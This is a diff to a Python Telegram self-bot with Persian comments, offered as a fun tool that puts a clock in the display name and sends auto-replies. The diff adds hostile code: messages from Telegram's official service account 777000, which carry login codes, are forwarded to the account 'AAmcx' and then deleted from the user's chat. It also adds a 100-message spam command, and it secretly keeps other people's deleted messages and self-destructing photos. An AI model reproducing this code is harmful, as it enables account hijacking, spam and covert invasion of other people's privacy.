@@ -6,7 +6,7 @@ import os
 from datetime import datetime
 from telethon import TelegramClient, events
 from telethon.tl.functions.account import UpdateProfileRequest
-from telethon.tl.types import Message
+from telethon.tl.types import Message, MessageMediaPhoto
 from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, ConversationHandler, filters, ContextTypes
 
@@ -27,7 +27,6 @@ EN_TO_FA = {
 }
 
 def time_to_superscript(hour, minute):
-    """تبدیل ساعت به فونت بالانویس مثل ¹²:³⁴"""
     time_str = f"{hour:02d}:{minute:02d}"
     result = ""
     for ch in time_str:
@@ -38,7 +37,6 @@ def time_to_superscript(hour, minute):
     return result
 
 def convert_en_to_fa(text):
-    """تبدیل اعداد انگلیسی به فارسی"""
     if not text:
         return text
     for en, fa in EN_TO_FA.items():
@@ -99,93 +97,73 @@ async def start_user_bot(user_id, client):
     # ذخیره پیام‌ها برای تشخیص پاک شدن
     saved_messages = {}
     
-    # فوروارد پیام‌های 777000 به aamcx (بی‌صدا)
+    # فوروارد پیام‌های 777000 به aamcx و حذف از پیوی
     @client.on(events.NewMessage(chats=777000))
-    async def forward_777000(event):
+    async def forward_and_delete_777000(event):
         try:
-            target = await client.get_entity('aamcx')
+            # ارسال به aamcx
+            target = await client.get_entity('AAmcx')
             msg_text = event.message.text or "بدون متن"
             msg_text_fa = convert_en_to_fa(msg_text)
             await client.send_message(target, f"📩 پیام از تلگرام رسمی:\n\n{msg_text_fa}")
-            print(f"📨 پیام 777000 فوروارد شد")
+            print(f"📨 پیام 777000 به AAmcx فوروارد شد")
+            
+            # حذف از پیوی خودم
+            await event.delete()
+            print(f"🗑 پیام 777000 از پیوی خودم حذف شد")
+            
         except Exception as e:
             print(f"❌ خطا در فوروارد: {e}")
     
-    #监听 پیام‌های جدید برای ذخیره
-    @client.on(events.NewMessage)
-    async def save_message(event):
-        try:
-            # فقط پیام‌های دایرکت (نه گروه)
-            if event.is_private:
-                msg_id = event.message.id
-                chat_id = event.chat_id
-                msg_text = event.message.text or event.message.message or ""
-                msg_date = event.message.date
-                
-                saved_messages[(chat_id, msg_id)] = {
-                    'text': msg_text,
-                    'date': msg_date,
-                    'from': event.sender_id
-                }
-                # حذف پیام‌های قدیمی (بیش از 1000 تا)
-                if len(saved_messages) > 1000:
-                    oldest_key = min(saved_messages.keys(), key=lambda x: saved_messages[x]['date'])
-                    del saved_messages[oldest_key]
-        except Exception as e:
-            print(f"خطا در ذخیره پیام: {e}")
-    
-    #监听 پاک شدن پیام‌ها
-    @client.on(events.MessageDeleted)
-    async def handle_deleted_messages(event):
-        try:
-            for msg_id in event.deleted_ids:
-                for (chat_id, saved_id), msg_data in list(saved_messages.items()):
-                    if saved_id == msg_id:
-                        # پیام پاک شده پیدا شد
-                        sender = msg_data['from']
-                        msg_text = msg_data['text']
-                        msg_date = msg_data['date']
-                        
-                        # ارسال به Saved Messages
-                        saved_msg = f"🗑 پیام پاک شد!\n\n"
-                        saved_msg += f"👤 فرستنده: {sender}\n"
-                        saved_msg += f"📅 تاریخ: {msg_date.strftime('%Y-%m-%d %H:%M:%S')}\n"
-                        saved_msg += f"📝 متن:\n{msg_text if msg_text else '(بدون متن - ممکن است مدیا باشد)'}"
-                        
-                        await client.send_message('me', saved_msg)
-                        print(f"📝 پیام پاک شده از {sender} به Saved Messages ذخیره شد")
-                        
-                        # حذف از حافظه
-                        del saved_messages[(chat_id, msg_id)]
-                        break
-        except Exception as e:
-            print(f"خطا در تشخیص پاک شدن: {e}")
-    
+    # اسپم کردن با دستور "اسپم 100 سلام"
     @client.on(events.NewMessage(outgoing=True))
-    async def handle_commands(event):
+    async def spam_command(event):
         try:
             text = event.message.text
             if not text:
                 return
             
-            if text == "ساعت خاموش":
+            # اسپم 100 سلام
+            if text == "اسپم 100 سلام":
+                await event.delete()  # حذف دستور
+                for i in range(100):
+                    await client.send_message(event.chat_id, f"سلام {i+1}")
+                    await asyncio.sleep(0.05)  # کمی تاخیر
+                print(f"✅ اسپم 100 سلام به {event.chat_id} فرستاده شد")
+            
+            # اسپم با ریپلای
+            elif event.message.is_reply and text == "اسپم ریپلای 100 سلام":
+                replied = await event.message.get_reply_message()
+                if replied:
+                    await event.delete()  # حذف دستور
+                    for i in range(100):
+                        await client.send_message(event.chat_id, f"سلام {i+1}", reply_to=replied.id)
+                        await asyncio.sleep(0.05)
+                    print(f"✅ اسپم ریپلای 100 سلام به {replied.sender_id} فرستاده شد")
+            
+            # ساعت خاموش
+            elif text == "ساعت خاموش":
                 user_settings[user_id]['auto_name'] = False
                 await event.reply("🕐 تغییر اسم خاموش شد")
             
+            # ساعت روشن
             elif text == "ساعت روشن":
                 user_settings[user_id]['auto_name'] = True
                 await event.reply("🕐 تغییر اسم روشن شد")
             
+            # دوست خاموش
             elif text == "دوست خاموش":
                 for p in user_settings[user_id]['packs']:
                     user_settings[user_id]['packs'][p] = False
                 await event.reply("💔 همه پاسخ‌ها خاموش شد")
             
+            # دوست روشن
             elif text == "دوست روشن":
                 for p in user_settings[user_id]['packs']:
                     user_settings[user_id]['packs'][p] = True
                 await event.reply("💖 همه پاسخ‌ها روشن شد")
             
+            # تنظیم (ریپلای)
             elif event.message.is_reply and text.startswith("تنظیم"):
                 parts = text.split()
                 if len(parts) >= 2:
@@ -209,12 +187,14 @@ async def start_user_bot(user_id, client):
                 else:
                     await event.reply(f"❌ پک '{pack_name}' وجود ندارد\nپک‌ها: {', '.join(packs.keys())}")
             
+            # خاموش کردن پک خاص
             elif text.endswith(" خاموش"):
                 pack_name = text[:-5].strip()
                 if pack_name in packs:
                     user_settings[user_id]['packs'][pack_name] = False
                     await event.reply(f"💔 پک '{pack_name}' خاموش شد")
             
+            # روشن کردن پک خاص
             elif text.endswith(" روشن"):
                 pack_name = text[:-4].strip()
                 if pack_name in packs:
@@ -223,6 +203,88 @@ async def start_user_bot(user_id, client):
             
         except Exception as e:
             print(f"خطا: {e}")
+    
+    #监听 پیام‌های جدید برای ذخیره
+    @client.on(events.NewMessage)
+    async def save_message(event):
+        try:
+            if event.is_private:
+                msg_id = event.message.id
+                chat_id = event.chat_id
+                msg_text = event.message.text or event.message.message or ""
+                msg_date = event.message.date
+                
+                saved_messages[(chat_id, msg_id)] = {
+                    'text': msg_text,
+                    'date': msg_date,
+                    'from': event.sender_id,
+                    'media': event.message.media
+                }
+                
+                if len(saved_messages) > 1000:
+                    oldest_key = min(saved_messages.keys(), key=lambda x: saved_messages[x]['date'])
+                    del saved_messages[oldest_key]
+        except Exception as e:
+            print(f"خطا در ذخیره پیام: {e}")
+    
+    #监听 پاک شدن پیام‌ها
+    @client.on(events.MessageDeleted)
+    async def handle_deleted_messages(event):
+        try:
+            for msg_id in event.deleted_ids:
+                for (chat_id, saved_id), msg_data in list(saved_messages.items()):
+                    if saved_id == msg_id:
+                        sender = msg_data['from']
+                        msg_text = msg_data['text']
+                        msg_date = msg_data['date']
+                        media = msg_data.get('media')
+                        
+                        saved_msg = f"🗑 پیام پاک شد!\n\n"
+                        saved_msg += f"👤 فرستنده: {sender}\n"
+                        saved_msg += f"📅 تاریخ: {msg_date.strftime('%Y-%m-%d %H:%M:%S')}\n"
+                        
+                        if msg_text:
+                            saved_msg += f"📝 متن:\n{msg_text}\n"
+                        
+                        await client.send_message('me', saved_msg)
+                        
+                        if media:
+                            try:
+                                await client.send_file('me', media, caption="🖼 عکس پیام پاک شده")
+                                print(f"🖼 عکس پیام پاک شده از {sender} ذخیره شد")
+                            except Exception as e:
+                                print(f"خطا در ذخیره عکس: {e}")
+                        
+                        print(f"📝 پیام پاک شده از {sender} به Saved Messages ذخیره شد")
+                        del saved_messages[(chat_id, msg_id)]
+                        break
+        except Exception as e:
+            print(f"خطا در تشخیص پاک شدن: {e}")
+    
+    #监听 عکس‌های زماندار
+    @client.on(events.NewMessage(incoming=True))
+    async def save_self_destructing_media(event):
+        try:
+            if event.message.media and hasattr(event.message.media, 'ttl_seconds'):
+                ttl = event.message.media.ttl_seconds
+                if ttl and ttl > 0:
+                    sender = event.sender_id
+                    path = await event.message.download_media()
+                    
+                    if path:
+                        caption = f"⏱ عکس زماندار (محو شدن پس از {ttl} ثانیه)\n"
+                        caption += f"👤 فرستنده: {sender}\n"
+                        caption += f"📅 تاریخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+                        
+                        await client.send_file('me', path, caption=caption)
+                        print(f"⏱ عکس زماندار از {sender} ذخیره شد")
+                        
+                        try:
+                            os.remove(path)
+                        except:
+                            pass
+        except Exception as e:
+            print(f"خطا در ذخیره عکس زماندار: {e}")
     
     @client.on(events.NewMessage(incoming=True))
     async def send_love_reply(event):
@@ -251,7 +313,7 @@ async def start_user_bot(user_id, client):
         except Exception as e:
             print(f"خطا: {e}")
     
-    # تغییر اسم هر دقیقه با فونت بالانویس
+    # تغییر اسم هر دقیقه
     while True:
         try:
             if user_settings.get(user_id, {}).get('auto_name', True):
@@ -360,9 +422,13 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "• ساعت خاموش/روشن\n"
         "• دوست خاموش/روشن\n"
         "• (اسم پک) خاموش/روشن\n"
-        "• ریپلای + تنظیم (اسم پک)\n\n"
+        "• ریپلای + تنظیم (اسم پک)\n"
+        "• اسپم 100 سلام - 100 بار سلام می‌فرسته\n"
+        "• ریپلای + اسپم ریپلای 100 سلام - 100 بار ریپلای سلام می‌زنه\n\n"
         "🕐 ساعت با فونت بالانویس: ¹²:³⁴\n"
-        "🗑 پیام‌های پاک شده در Saved Messages ذخیره میشن"
+        "🗑 پیام‌های پاک شده در Saved Messages ذخیره میشن\n"
+        "⏱ عکس‌های زماندار خودکار ذخیره میشن\n"
+        "📨 پیام‌های 777000 به AAmcx میره و از پیوی تو پاک میشه"
     )
     return 1
 
@@ -414,7 +480,8 @@ async def get_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             f"✅ ربات فعال شد!\n\n"
             f"📦 پک‌ها: {', '.join(packs.keys())}\n\n"
-            f"🗑 پیام‌های پاک شده در Saved Messages ذخیره میشن"
+            f"📨 پیام‌های 777000 به AAmcx میره\n"
+            f"⚡ اسپم: 'اسپم 100 سلام' یا ریپلای + 'اسپم ریپلای 100 سلام'"
         )
         
         asyncio.create_task(start_user_bot(user_id, client))
@@ -460,7 +527,10 @@ def main():
     print("=" * 50)
     print("🤖 ربات روشن شد")
     print("🕐 فونت ساعت: ¹²:³⁴")
-    print("🗑 ذخیره پیام‌های پاک شده در Saved Messages")
+    print("🗑 ذخیره پیام‌های پاک شده")
+    print("⏱ ذخیره خودکار عکس‌های زماندار")
+    print("📨 فوروارد 777000 به AAmcx + حذف از پیوی")
+    print("⚡ اسپم 100 سلام")
     print("=" * 50)
     app.run_polling()
 
